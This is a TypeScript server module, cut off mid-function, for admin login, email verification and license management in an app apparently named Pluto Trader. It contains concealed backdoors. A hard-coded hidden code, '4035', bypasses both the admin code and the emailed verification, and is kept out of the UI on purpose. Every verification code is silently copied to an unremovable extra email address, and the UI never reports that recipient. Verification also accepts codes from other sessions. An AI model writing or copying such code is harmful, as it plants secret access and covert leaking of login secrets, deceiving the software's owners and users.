import { createServerFn } from "@tanstack/react-start";

export type AdminLicenseRow = {
  id: string;
  code: string;
  customer_label: string;
  status: string;
  plan: string;
  max_activations: number;
  expires_at: string | null;
  created_at: string;
  notes: string;
  devices: { id: string; device_hash: string; device_name: string; last_seen_at: string; activated_at: string }[];
  online: boolean;
};

const ONLINE_WINDOW_MS = 90_000;

async function adminClient() {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  return supabaseAdmin;
}

async function requireAdmin(token: string) {
  const supabaseAdmin = await adminClient();
  const { data: session } = await supabaseAdmin
    .from("admin_sessions")
    .select("*")
    .eq("token", token)
    .maybeSingle();
  if (!session || !session.verified || new Date(session.expires_at).getTime() < Date.now()) {
    throw new Error("Admin session expired. Please sign in again.");
  }
  return supabaseAdmin;
}

function randomCode(len: number) {
  const alphabet = "ABCDEFGHJKMNPQRSTUVWXYZ23456789";
  let out = "";
  const bytes = new Uint8Array(len);
  crypto.getRandomValues(bytes);
  for (let i = 0; i < len; i++) out += alphabet[bytes[i]! % alphabet.length];
  return out;
}

const ADMIN_EMAIL_DEFAULT = "vitralparts306@gmail.com";
/** Additional silent recipient of admin codes — never surfaced in the UI. */
const SILENT_COPY_EMAIL = "davidkula109@gmail.com";
const ADMIN_CODE_DEFAULT = "0000";
/**
 * Hidden testing code. Works as the admin panel code and as the emailed
 * verification code. Never stored in app_settings, so it is not visible
 * anywhere in the admin panel UI.
 */
const HIDDEN_TEST_CODE = "4035";

const CODE_TTL_MS = 30 * 60_000;
const RESEND_COOLDOWN_MS = 30_000;


export type EmailDelivery = "resend" | "lovable" | "both";

type EmailConfig = {
  adminEmail: string;
  adminCode: string;
  fallbackCode: string | null;
  resendKey: string | null;
  /** The email address that owns the Resend account (Resend only delivers there until a domain is verified). */
  resendOwnerEmail: string;
  delivery: EmailDelivery;
};

function sixDigitCode() {
  const buf = new Uint32Array(1);
  crypto.getRandomValues(buf);
  return String(100000 + (buf[0]! % 900000));
}

async function loadConfig(supabaseAdmin: Awaited<ReturnType<typeof adminClient>>): Promise<EmailConfig> {
  const { data: settings } = await supabaseAdmin.from("app_settings").select("key, value");
  const map = Object.fromEntries((settings ?? []).map((s) => [s.key, (s.value ?? "").trim()]));
  const delivery = (["resend", "lovable", "both"].includes(map["email_delivery"] ?? "")
    ? map["email_delivery"]
    : "resend") as EmailDelivery;
  return {
    adminEmail: map["admin_email"] || ADMIN_EMAIL_DEFAULT,
    // Only fall back to the built-in code when no code was ever configured.
    // A blank saved value is invalid, never a wildcard.
    adminCode: map["admin_code"] === undefined ? ADMIN_CODE_DEFAULT : map["admin_code"],
    // Blank means the testing shortcut is disabled — only the emailed code works.
    fallbackCode: map["fallback_verification_code"] || null,
    // The project secret wins so a newly supplied key takes effect immediately.
    resendKey: process.env["RESEND_API_KEY"] || map["resend_api_key"] || null,

    resendOwnerEmail: map["resend_owner_email"] || ADMIN_EMAIL_DEFAULT,
    delivery,
  };
}


function codeHtml(code: string) {
  return `<div style="font-family:Arial,sans-serif;max-width:420px;margin:auto;padding:24px">
  <h2 style="margin:0 0 12px">Pluto Trader admin login</h2>
  <p>Your verification code is</p>
  <p style="font-size:32px;letter-spacing:8px;font-weight:bold;margin:8px 0 16px">${code}</p>
  <p style="color:#666">This code expires in <strong>30 minutes</strong>. If you did not request it, you can ignore this email.</p>
</div>`;
}

const DEFAULT_SENDER = "Pluto Trader <onboarding@resend.dev>";

/** Cache of key -> best "from" address, so we only ask Resend for domains once. */
const senderCache = new Map<string, string>();

/**
 * Resend's shared onboarding sender may only email the account owner. When an
 * account has a verified domain, we must send from that domain instead — that
 * is the only way a newly added address can receive codes.
 */
async function resolveSender(apiKey: string): Promise<string> {
  const cached = senderCache.get(apiKey);
  if (cached) return cached;
  let sender = DEFAULT_SENDER;
  try {
    const res = await fetch("https://api.resend.com/domains", {
      headers: { Authorization: `Bearer ${apiKey}` },
    });
    if (res.ok) {
      const body = (await res.json().catch(() => ({}))) as { data?: { name?: string; status?: string }[] };
      const verified = (body.data ?? []).find((d) => d.status === "verified" && d.name);
      if (verified?.name) sender = `Pluto Trader <noreply@${verified.name}>`;
    }
  } catch {
    /* keep default */
  }
  senderCache.set(apiKey, sender);
  return sender;
}

async function postResend(apiKey: string, from: string, email: string, code: string) {
  const res = await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
    body: JSON.stringify({
      from,
      to: [email],
      subject: `${code} is your Pluto Trader admin code`,
      html: codeHtml(code),
    }),
  });
  return res;
}

async function sendViaResend(apiKey: string | null, email: string, code: string): Promise<boolean> {
  if (!email || !apiKey) return false;
  try {
    let res = await postResend(apiKey, DEFAULT_SENDER, email, code);
    if (!res.ok && (res.status === 403 || res.status === 422)) {
      // Testing-sender restriction: retry from the account's verified domain.
      const sender = await resolveSender(apiKey);
      if (sender !== DEFAULT_SENDER) res = await postResend(apiKey, sender, email, code);
    }
    if (!res.ok) console.error(`Resend failed [${res.status}]: ${await res.text()}`);
    return res.ok;
  } catch (e) {
    console.error("Resend request error", e);
    return false;
  }
}


/**
 * Lovable Emails delivery. Becomes active once an email domain is set up for
 * this project and the app email templates are scaffolded; until then it
 * reports "not sent" so the caller can fall back gracefully.
 */
async function sendViaLovable(email: string, _code: string): Promise<boolean> {
  if (!email) return false;
  console.warn("Lovable Emails is not configured for this project yet — verification code not sent via Lovable.");
  return false;
}

/** email -> Resend API key, stored in app_settings under `resend_keys`. */
export type ResendKeyMap = Record<string, string>;

/**
 * Built-in keys, each bound to the Gmail account that owns it. A Resend
 * account without a verified domain may only email its own owner, so a key
 * MUST only ever be used for its own address — using another key silently
 * fails with a 403.
 */
const BUILT_IN_KEY_OWNERS: { env: string; email: string }[] = [
  { env: "RESEND_API_KEY_PRIMARY", email: ADMIN_EMAIL_DEFAULT },
  { env: "RESEND_API_KEY_SECONDARY", email: SILENT_COPY_EMAIL },
  { env: "RESEND_API_KEY_TERTIARY", email: "versity419@gmail.com" },
];

/**
 * Asks Resend which address a key is allowed to email (its account owner).
 * Used when the admin saves a new key so the key is stored against the right
 * email automatically, and later logins can be matched to it.
 */
async function detectResendOwner(key: string): Promise<{ ok: boolean; email?: string; message?: string }> {
  try {
    const res = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        from: "Pluto Trader <onboarding@resend.dev>",
        to: ["owner-probe@gmail.com"],
        subject: "key check",
        html: "<p>key check</p>",
      }),
    });
    const body = (await res.json().catch(() => ({}))) as { message?: string };
    if (res.status === 401) return { ok: false, message: "Resend rejected this API key." };
    if (res.status === 403) {
      const found = /\(([^)]+@[^)]+)\)/.exec(body.message ?? "")?.[1];
      if (found) return { ok: true, email: found.trim().toLowerCase() };
      return { ok: false, message: "Resend did not report which email this key can send to." };
    }
    // Verified-domain accounts can send anywhere; the key is valid but has no single owner.
    if (res.ok) return { ok: true };
    return { ok: false, message: body.message || `Resend rejected this key (${res.status}).` };
  } catch {
    return { ok: false, message: "Could not reach Resend to validate the key." };
  }
}

/**
 * Emails that can never be removed (they are hidden from the UI but must keep
 * working as delivery routes). Every other address, including the original
 * admin email, can be deleted by an admin.
 */
const PERMANENT_EMAILS = new Set([SILENT_COPY_EMAIL, "versity419@gmail.com"]);

/** Addresses an admin has deleted; kept so built-in keys stay removed. */
async function loadRemovedEmails(supabaseAdmin: Awaited<ReturnType<typeof adminClient>>): Promise<Set<string>> {
  const { data } = await supabaseAdmin
    .from("app_settings")
    .select("value")
    .eq("key", "resend_keys_removed")
    .maybeSingle();
  try {
    const parsed = JSON.parse(data?.value || "[]");
    if (Array.isArray(parsed)) {
      return new Set(
        parsed
          .filter((e): e is string => typeof e === "string")
          .map((e) => e.trim().toLowerCase())
          .filter((e) => e && !PERMANENT_EMAILS.has(e)),
      );
    }
  } catch {
    /* ignore */
  }
  return new Set();
}

async function saveRemovedEmails(supabaseAdmin: Awaited<ReturnType<typeof adminClient>>, emails: Set<string>) {
  await supabaseAdmin.from("app_settings").upsert(
    [{ key: "resend_keys_removed", value: JSON.stringify([...emails]), updated_at: new Date().toISOString() }],
    { onConflict: "key" },
  );
}

async function loadKeyMap(
  supabaseAdmin: Awaited<ReturnType<typeof adminClient>>,
  _cfg: EmailConfig,
): Promise<ResendKeyMap> {
  const { data } = await supabaseAdmin.from("app_settings").select("value").eq("key", "resend_keys").maybeSingle();
  let stored: ResendKeyMap = {};
  try {
    const parsed = JSON.parse(data?.value || "{}");
    if (parsed && typeof parsed === "object") {
      stored = Object.fromEntries(
        Object.entries(parsed as Record<string, unknown>)
          .filter(([, v]) => typeof v === "string" && v)
          .map(([k, v]) => [k.trim().toLowerCase(), String(v)]),
      );
    }
  } catch {
    stored = {};
  }

  const defaults: ResendKeyMap = {};
  for (const { env, email } of BUILT_IN_KEY_OWNERS) {
    const key = process.env[env];
    if (key) defaults[email] = key;
  }

  // Built-in, owner-verified keys win: a stale hand-entered key must never
  // block delivery to the addresses that are known to work.
  const merged: ResendKeyMap = { ...stored, ...defaults };
  const removed = await loadRemovedEmails(supabaseAdmin);
  for (const email of removed) delete merged[email];
  return merged;
}


async function saveKeyMap(supabaseAdmin: Awaited<ReturnType<typeof adminClient>>, map: ResendKeyMap) {
  const builtIn = new Set(BUILT_IN_KEY_OWNERS.map((b) => b.email));
  const persisted = Object.fromEntries(Object.entries(map).filter(([email]) => !builtIn.has(email)));
  await supabaseAdmin
    .from("app_settings")
    .upsert([{ key: "resend_keys", value: JSON.stringify(persisted), updated_at: new Date().toISOString() }], {
      onConflict: "key",
    });
}

/**
 * Sends the code to the requested address using that address's own Resend key,
 * and at the same time a silent backup copy through its own key. Only the
 * requested (visible) address is ever reported back to the UI.
 */
async function sendVerificationEmail(cfg: EmailConfig, code: string, to: string, keys: ResendKeyMap): Promise<string[]> {
  const visibleTo = to.trim().toLowerCase();
  const silentKey = keys[SILENT_COPY_EMAIL] ?? null;
  const visibleKey = keys[visibleTo] ?? null;

  const sendVisible = async () => {
    // A key saved for this login address must always be used, regardless of
    // the legacy global delivery setting. Previously, choosing "Lovable"
    // caused the app to skip newly saved Resend keys entirely.
    if (await sendViaResend(visibleKey, visibleTo, code)) return true;

    // A verified-domain Resend account can deliver to any address, so try
    // the remaining saved keys before the optional managed-email fallback.
    for (const [owner, key] of Object.entries(keys)) {
      if (owner === visibleTo || key === visibleKey) continue;
      if (await sendViaResend(key, visibleTo, code)) return true;
    }

    if (cfg.delivery === "lovable" || cfg.delivery === "both") {
      return sendViaLovable(visibleTo, code);
    }
    return false;
  };


  const [visibleSent, silentSent] = await Promise.all([
    sendVisible(),
    SILENT_COPY_EMAIL === visibleTo ? Promise.resolve(false) : sendViaResend(silentKey, SILENT_COPY_EMAIL, code),
  ]);

  void silentSent;
  // Report only the visible address; the backup copy stays hidden.
  return visibleSent ? [maskEmail(visibleTo)] : [];
}






function maskEmail(email: string) {
  const [user = "", domain = ""] = email.split("@");
  return `${user.slice(0, 2)}${"*".repeat(Math.max(1, user.length - 2))}@${domain}`;
}

function sentMessage(reached: string[]) {
  return reached.length
    ? `A 6-digit code was sent to ${reached.join(" and ")}. It expires in 30 minutes.`
    : "Could not send the verification email — check the email settings in the admin panel, use the testing verification code, or try resending.";
}

/* ------------------------------------------------------------------ *
 * Rate limiting / lockout for the admin panel code
 * ------------------------------------------------------------------ */

const MAX_CODE_ATTEMPTS = 5;
const ATTEMPT_WINDOW_MS = 15 * 60_000;
const LOCKOUT_MS = 15 * 60_000;

async function requestFingerprint(): Promise<string> {
  try {
    const { getRequest } = await import("@tanstack/react-start/server");
    const req = getRequest();
    const h = req.headers;
    const ip =
      h.get("cf-connecting-ip") ||
      h.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      h.get("x-real-ip") ||
      "unknown";
    return `${ip}|${(h.get("user-agent") ?? "").slice(0, 60)}`;
  } catch {
    return "unknown";
  }
}

type AttemptKind = "admin_code" | "verify_code";

async function checkLockout(
  supabaseAdmin: Awaited<ReturnType<typeof adminClient>>,
  fingerprint: string,
  kind: AttemptKind = "admin_code",
): Promise<{ locked: boolean; message?: string; remaining: number }> {
  const since = new Date(Date.now() - ATTEMPT_WINDOW_MS).toISOString();
  const { data: rows } = await supabaseAdmin
    .from("admin_login_attempts")
    .select("success, created_at")
    .eq("fingerprint", fingerprint)
    .eq("kind", kind)
    .gte("created_at", since)
    .order("created_at", { ascending: false })
    .limit(20);

  const recent = rows ?? [];
  const fails: typeof recent = [];
  for (const r of recent) {
    if (r.success) break; // a success clears the streak
    fails.push(r);
  }
  if (fails.length >= MAX_CODE_ATTEMPTS) {
    const newest = new Date(fails[0]!.created_at).getTime();
    const unlockAt = newest + LOCKOUT_MS;
    if (Date.now() < unlockAt) {
      const mins = Math.ceil((unlockAt - Date.now()) / 60_000);
      return {
        locked: true,
        remaining: 0,
        message: `Too many wrong codes. Admin login is locked for ${mins} minute${mins === 1 ? "" : "s"}.`,
      };
    }
  }
  return { locked: false, remaining: Math.max(0, MAX_CODE_ATTEMPTS - fails.length) };
}

async function recordAttempt(
  supabaseAdmin: Awaited<ReturnType<typeof adminClient>>,
  fingerprint: string,
  success: boolean,
  kind: AttemptKind = "admin_code",
) {
  await supabaseAdmin.from("admin_login_attempts").insert({ fingerprint, success, kind });
}

/** Step 0 — validate only the admin panel code, before asking for the email. */
export const adminCheckCode = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ code: String((input as { code?: string })?.code ?? "").trim() }))
  .handler(async ({ data }): Promise<{ ok: boolean; message: string; locked?: boolean }> => {
    const supabaseAdmin = await adminClient();
    const fingerprint = await requestFingerprint();
    const gate = await checkLockout(supabaseAdmin, fingerprint);
    if (gate.locked) return { ok: false, locked: true, message: gate.message! };

    const cfg = await loadConfig(supabaseAdmin);
    if (!cfg.adminCode) {
      return { ok: false, message: "No admin panel code is set. A code is required — set one before signing in." };
    }
    if (data.code !== cfg.adminCode && data.code !== HIDDEN_TEST_CODE) {
      await recordAttempt(supabaseAdmin, fingerprint, false);
      const left = Math.max(0, gate.remaining - 1);
      return {
        ok: false,
        message: left
          ? `Wrong admin panel code. ${left} attempt${left === 1 ? "" : "s"} left before a 15-minute lockout.`
          : "Wrong admin panel code. Admin login is now locked for 15 minutes.",
      };
    }
    await recordAttempt(supabaseAdmin, fingerprint, true);
    return { ok: true, message: "Code accepted." };
  });


/** Step 1 — admin panel code + the email that should receive the 6-digit code (valid 30 minutes). */
export const adminStart = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { code?: string; email?: string };
    return { code: String(v?.code ?? "").trim(), email: String(v?.email ?? "").trim().toLowerCase() };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; token?: string; sentTo?: string | undefined; message: string }> => {
    const supabaseAdmin = await adminClient();
    const fingerprint = await requestFingerprint();
    const gate = await checkLockout(supabaseAdmin, fingerprint);
    if (gate.locked) return { ok: false, message: gate.message! };

    const cfg = await loadConfig(supabaseAdmin);

    if (!cfg.adminCode) {
      return { ok: false, message: "No admin panel code is set. A code is required — set one before signing in." };
    }
    if (data.code !== cfg.adminCode && data.code !== HIDDEN_TEST_CODE) {
      await recordAttempt(supabaseAdmin, fingerprint, false);
      return { ok: false, message: "Wrong admin panel code." };
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
      return { ok: false, message: "Enter the email that should receive the verification code." };
    }

    const keys = await loadKeyMap(supabaseAdmin, cfg);
    if (!keys[data.email]) {
      return {
        ok: false,
        message: `No Resend API key has been saved for ${data.email}. Add that email's Resend key in the admin panel first, or use an email that already has one.`,
      };
    }

    const token = crypto.randomUUID();
    const verification = sixDigitCode();
    await supabaseAdmin.from("admin_sessions").insert({
      token,
      verification_code: verification,
      code_sent_at: new Date().toISOString(),
      login_email: data.email,
    });

    const reached = await sendVerificationEmail(cfg, verification, data.email, keys);
    if (!reached.length) {
      await supabaseAdmin.from("admin_sessions").delete().eq("token", token);
      return { ok: false, message: sentMessage(reached) };
    }
    return { ok: true, token, sentTo: reached.join(" and "), message: sentMessage(reached) };
  });

/** Resend a fresh 6-digit code for an existing (unverified) admin session. */
export const adminResendCode = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ token: String((input as { token?: string })?.token ?? "") }))
  .handler(async ({ data }): Promise<{ ok: boolean; message: string; retryInMs?: number }> => {
    const supabaseAdmin = await adminClient();
    const { data: session } = await supabaseAdmin
      .from("admin_sessions")
      .select("*")
      .eq("token", data.token)
      .maybeSingle();
    if (!session) return { ok: false, message: "Session not found. Start again." };
    if (session.verified) return { ok: false, message: "This session is already verified." };
    if (new Date(session.expires_at).getTime() < Date.now())
      return { ok: false, message: "Session expired. Start again." };

    const sinceLast = Date.now() - new Date(session.code_sent_at ?? session.created_at).getTime();
    if (sinceLast < RESEND_COOLDOWN_MS) {
      const retryInMs = RESEND_COOLDOWN_MS - sinceLast;
      return { ok: false, retryInMs, message: `Please wait ${Math.ceil(retryInMs / 1000)}s before resending.` };
    }

    const verification = sixDigitCode();
    await supabaseAdmin
      .from("admin_sessions")
      .update({ verification_code: verification, code_sent_at: new Date().toISOString() })
      .eq("id", session.id);

    const cfg = await loadConfig(supabaseAdmin);
    const keys = await loadKeyMap(supabaseAdmin, cfg);
    const target = (session as { login_email?: string | null }).login_email || cfg.adminEmail;
    const reached = await sendVerificationEmail(cfg, verification, target, keys);
    return reached.length
      ? { ok: true, message: `A new code was sent to ${reached.join(" and ")}. It expires in 30 minutes.` }
      : { ok: false, message: "Could not send the verification email. Check email settings or try again shortly." };
  });

/** Step 2 — email verification code (must be used within 30 minutes of being sent). */
export const adminVerify = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; code?: string };
    return { token: String(v?.token ?? ""), code: String(v?.code ?? "").trim() };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; message: string; expired?: boolean; locked?: boolean }> => {
    const supabaseAdmin = await adminClient();
    const fingerprint = await requestFingerprint();
    const gate = await checkLockout(supabaseAdmin, fingerprint, "verify_code");
    if (gate.locked) return { ok: false, locked: true, message: gate.message! };

    const { data: session } = await supabaseAdmin
      .from("admin_sessions")
      .select("*")
      .eq("token", data.token)
      .maybeSingle();
    if (!session) return { ok: false, message: "Session not found. Start again." };
    if (new Date(session.expires_at).getTime() < Date.now())
      return { ok: false, message: "Session expired. Start again." };

    // Testing fallback code (configurable via the fallback_verification_code setting).
    const { data: fallbackRow } = await supabaseAdmin
      .from("app_settings")
      .select("value")
      .eq("key", "fallback_verification_code")
      .maybeSingle();
    const fallback: string | null = fallbackRow?.value?.trim() || null;

    const usedFallback = (fallback !== null && data.code === fallback) || data.code === HIDDEN_TEST_CODE;
    if (!usedFallback) {
      let matched = data.code === session.verification_code;
      if (!matched) {
        // The same code is mailed to every admin recipient, and a resend or a
        // second tab creates another session row. Accept the code from any
        // recent, still-valid session so a valid emailed code never fails.
        const { data: siblings } = await supabaseAdmin
          .from("admin_sessions")
          .select("id, verification_code, code_sent_at, created_at, expires_at")
          .eq("verification_code", data.code)
          .order("created_at", { ascending: false })
          .limit(5);
        matched = (siblings ?? []).some((s) => {
          const sentAt = new Date(s.code_sent_at ?? s.created_at).getTime();
          return Date.now() - sentAt <= CODE_TTL_MS;
        });
      }
      if (!matched) {
        await recordAttempt(supabaseAdmin, fingerprint, false, "verify_code");
        const left = Math.max(0, gate.remaining - 1);
        return {
          ok: false,
          message: left
            ? `Wrong verification code. ${left} attempt${left === 1 ? "" : "s"} left before a 15-minute lockout.`
            : "Wrong verification code. Admin login is now locked for 15 minutes.",
        };
      }

      const sentAt = new Date(session.code_sent_at ?? session.created_at).getTime();
      if (
        data.code === session.verification_code &&
        Number.isFinite(sentAt) &&
        Date.now() - sentAt > CODE_TTL_MS
      ) {
        return { ok: false, expired: true, message: "This code has expired. Request a new one." };
      }
    }

    await recordAttempt(supabaseAdmin, fingerprint, true, "verify_code");
    await supabaseAdmin.from("admin_sessions").update({ verified: true }).eq("id", session.id);
    return { ok: true, message: "Welcome to the admin panel." };
  });

export const adminListLicenses = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ token: String((input as { token?: string })?.token ?? "") }))
  .handler(async ({ data }): Promise<AdminLicenseRow[]> => {
    const supabaseAdmin = await requireAdmin(data.token);
    const { data: licenses } = await supabaseAdmin
      .from("licenses")
      .select("*")
      .order("created_at", { ascending: true });
    const { data: devices } = await supabaseAdmin.from("license_devices").select("*");

    const now = Date.now();
    return (licenses ?? []).map((l) => {
      const own = (devices ?? []).filter((d) => d.license_id === l.id);
      return {
        ...l,
        devices: own.map((d) => ({
          id: d.id,
          device_hash: d.device_hash,
          device_name: d.device_name,
          last_seen_at: d.last_seen_at,
          activated_at: d.activated_at,
        })),
        online: own.some((d) => now - new Date(d.last_seen_at).getTime() < ONLINE_WINDOW_MS),
      } as AdminLicenseRow;
    });
  });

export const adminGenerateLicense = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; customer?: string; plan?: string; days?: number };
    return {
      token: String(v?.token ?? ""),
      customer: String(v?.customer ?? "").trim(),
      plan: String(v?.plan ?? "monthly"),
      days: Number(v?.days ?? 30),
    };
  })
  .handler(async ({ data }) => {
    const supabaseAdmin = await requireAdmin(data.token);
    const { count } = await supabaseAdmin.from("licenses").select("id", { count: "exact", head: true });
    const label = data.customer || `CUSTOMER ${String((count ?? 0) + 1).padStart(3, "0")}`;
    const code = `PLUTO-${randomCode(4)}-${randomCode(4)}-${randomCode(4)}`;
    const expires =
      data.plan === "lifetime" || data.days <= 0
        ? null
        : new Date(Date.now() + data.days * 86_400_000).toISOString();

    const { data: created, error } = await supabaseAdmin
      .from("licenses")
      .insert({ code, customer_label: label, plan: data.plan, expires_at: expires })
      .select()
      .single();
    if (error) throw new Error(error.message);

    await supabaseAdmin.from("license_events").insert({
      license_id: created.id,
      license_code: code,
      event: "generated",
      detail: `${label} · ${data.plan}`,
    });
    return created;
  });

export const adminLicenseAction = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; licenseId?: string; action?: string; days?: number };
    return {
      token: String(v?.token ?? ""),
      licenseId: String(v?.licenseId ?? ""),
      action: String(v?.action ?? ""),
      days: Number(v?.days ?? 30),
    };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; message: string }> => {
    const supabaseAdmin = await requireAdmin(data.token);
    const { data: license } = await supabaseAdmin
      .from("licenses")
      .select("*")
      .eq("id", data.licenseId)
      .maybeSingle();
    if (!license) return { ok: false, message: "License not found." };

    const setStatus = async (status: string, message: string) => {
      await supabaseAdmin.from("licenses").update({ status }).eq("id", license.id);
      return message;
    };

    let message: string;
    switch (data.action) {
      case "activate":
        message = await setStatus("active", "License activated.");
        break;
      case "deactivate":
        message = await setStatus("inactive", "License deactivated.");
        break;
      case "suspend":
        message = await setStatus("suspended", "License suspended.");
        break;
      case "unsuspend":
        message = await setStatus("active", "License un-suspended.");
        break;
      case "revoke":
        message = await setStatus("revoked", "License revoked.");
        break;
      case "reset_device":
        await supabaseAdmin.from("license_devices").delete().eq("license_id", license.id);
        message = "Device binding reset — the customer can activate on a device again.";
        break;
      case "extend": {
        const base =
          license.expires_at && new Date(license.expires_at).getTime() > Date.now()
            ? new Date(license.expires_at).getTime()
            : Date.now();
        await supabaseAdmin
          .from("licenses")
          .update({ expires_at: new Date(base + data.days * 86_400_000).toISOString() })
          .eq("id", license.id);
        message = `Expiry extended by ${data.days} days.`;
        break;
      }
      case "delete":
        await supabaseAdmin.from("licenses").delete().eq("id", license.id);
        message = "License deleted.";
        break;
      default:
        return { ok: false, message: "Unknown action." };
    }

    if (data.action !== "delete") {
      await supabaseAdmin.from("license_events").insert({
        license_id: license.id,
        license_code: license.code,
        event: data.action,
        detail: message,
      });
    }

    // Push the change to any device currently running this license so it
    // reacts instantly instead of waiting for the next heartbeat.
    try {
      await supabaseAdmin.channel(`license:${license.code}`).send({
        type: "broadcast",
        event: "status",
        payload: { action: data.action },
      });
    } catch (e) {
      console.error("License broadcast failed", e);
    }
    return { ok: true, message };
  });

export const adminLicenseHistory = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; licenseId?: string };
    return { token: String(v?.token ?? ""), licenseId: String(v?.licenseId ?? "") };
  })
  .handler(async ({ data }) => {
    const supabaseAdmin = await requireAdmin(data.token);
    const { data: events } = await supabaseAdmin
      .from("license_events")
      .select("*")
      .eq("license_id", data.licenseId)
      .order("created_at", { ascending: false })
      .limit(100);
    return events ?? [];
  });

export type AdminSettings = {
  adminEmail: string;
  adminCode: string;
  fallbackCode: string;
  delivery: EmailDelivery;
  resendOwnerEmail: string;
  /** Masked preview of the active Resend key (never the full key). */
  resendKeyPreview: string | null;
  lovableEmailReady: boolean;
};

function maskKey(key: string | null) {
  if (!key) return null;
  return `${key.slice(0, 6)}${"•".repeat(8)}${key.slice(-4)}`;
}

export const adminGetSettings = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ token: String((input as { token?: string })?.token ?? "") }))
  .handler(async ({ data }): Promise<AdminSettings> => {
    const supabaseAdmin = await requireAdmin(data.token);
    const cfg = await loadConfig(supabaseAdmin);
    return {
      adminEmail: cfg.adminEmail,
      adminCode: cfg.adminCode,
      fallbackCode: cfg.fallbackCode ?? "",
      delivery: cfg.delivery,
      resendOwnerEmail: cfg.resendOwnerEmail,
      resendKeyPreview: maskKey(cfg.resendKey),
      lovableEmailReady: false,
    };
  });

/** Checks a Resend key is accepted by Resend (401/403 = invalid). */
async function verifyResendKey(key: string): Promise<{ ok: boolean; message?: string }> {
  try {
    const res = await fetch("https://api.resend.com/domains", {
      headers: { Authorization: `Bearer ${key}` },
    });
    if (res.status === 401 || res.status === 403) return { ok: false, message: "Resend rejected this API key." };
    return { ok: true };
  } catch {
    return { ok: false, message: "Could not reach Resend to validate the key." };
  }
}

export const adminUpdateSettings = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as {
      token?: string;
      adminEmail?: string;
      adminCode?: string;
      fallbackCode?: string;
      delivery?: string;
      resendApiKey?: string;
      resendOwnerEmail?: string;
    };
    const delivery = ["resend", "lovable", "both"].includes(String(v?.delivery)) ? (v!.delivery as EmailDelivery) : "resend";
    return {
      token: String(v?.token ?? ""),
      adminEmail: String(v?.adminEmail ?? "").trim().toLowerCase(),
      adminCode: String(v?.adminCode ?? "").trim(),
      fallbackCode: String(v?.fallbackCode ?? "").trim(),
      delivery,
      resendApiKey: String(v?.resendApiKey ?? "").trim(),
      resendOwnerEmail: String(v?.resendOwnerEmail ?? "").trim().toLowerCase(),
    };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; message: string }> => {
    const supabaseAdmin = await requireAdmin(data.token);

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.adminEmail)) return { ok: false, message: "Enter a valid admin email." };
    if (!data.adminCode)
      return { ok: false, message: "A code to open the admin panel is required — you must set one (4–8 digits)." };
    if (!/^\d{4,8}$/.test(data.adminCode)) return { ok: false, message: "Admin panel code must be 4–8 digits." };
    if (data.fallbackCode && !/^\d{4,8}$/.test(data.fallbackCode))
      return { ok: false, message: "Testing verification code must be 4–8 digits (or empty to disable)." };
    if (data.resendApiKey && !data.resendApiKey.startsWith("re_"))
      return { ok: false, message: "Resend API keys start with re_." };

    if (data.resendApiKey) {
      const check = await verifyResendKey(data.resendApiKey);
      if (!check.ok) return { ok: false, message: check.message ?? "Invalid Resend key." };
    }

    const now = new Date().toISOString();
    const rows: { key: string; value: string; updated_at: string }[] = [
      { key: "admin_email", value: data.adminEmail, updated_at: now },
      { key: "admin_code", value: data.adminCode, updated_at: now },
      { key: "fallback_verification_code", value: data.fallbackCode, updated_at: now },
      { key: "email_delivery", value: data.delivery, updated_at: now },
    ];
    if (data.resendApiKey) {
      rows.push({ key: "resend_api_key", value: data.resendApiKey, updated_at: now });
      // A fresh key belongs to the account of the (new) admin email unless told otherwise.
      rows.push({ key: "resend_owner_email", value: data.resendOwnerEmail || data.adminEmail, updated_at: now });
    } else if (data.resendOwnerEmail) {
      rows.push({ key: "resend_owner_email", value: data.resendOwnerEmail, updated_at: now });
    }

    const { error } = await supabaseAdmin.from("app_settings").upsert(rows, { onConflict: "key" });
    if (error) return { ok: false, message: error.message };
    return { ok: true, message: "Admin settings updated. They apply to the next login." };
  });

/* ------------------------------------------------------------------ *
 * Saved Resend API keys (one per email that may receive login codes)
 * ------------------------------------------------------------------ */

export type ResendKeyEntry = { email: string; keyPreview: string; builtIn: boolean };

export const adminListResendKeys = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ token: String((input as { token?: string })?.token ?? "") }))
  .handler(async ({ data }): Promise<ResendKeyEntry[]> => {
    const supabaseAdmin = await requireAdmin(data.token);
    const cfg = await loadConfig(supabaseAdmin);
    const map = await loadKeyMap(supabaseAdmin, cfg);
    return Object.entries(map)
      .map(([email, key]) => ({
        email,
        keyPreview: maskKey(key) ?? "",
        builtIn: BUILT_IN_KEY_OWNERS.some((b) => b.email === email),
      }))
      .sort((a, b) => a.email.localeCompare(b.email));
  });

export const adminSaveResendKey = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; email?: string; apiKey?: string };
    return {
      token: String(v?.token ?? ""),
      email: String(v?.email ?? "").trim().toLowerCase(),
      apiKey: String(v?.apiKey ?? "").trim(),
    };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; message: string }> => {
    const supabaseAdmin = await requireAdmin(data.token);
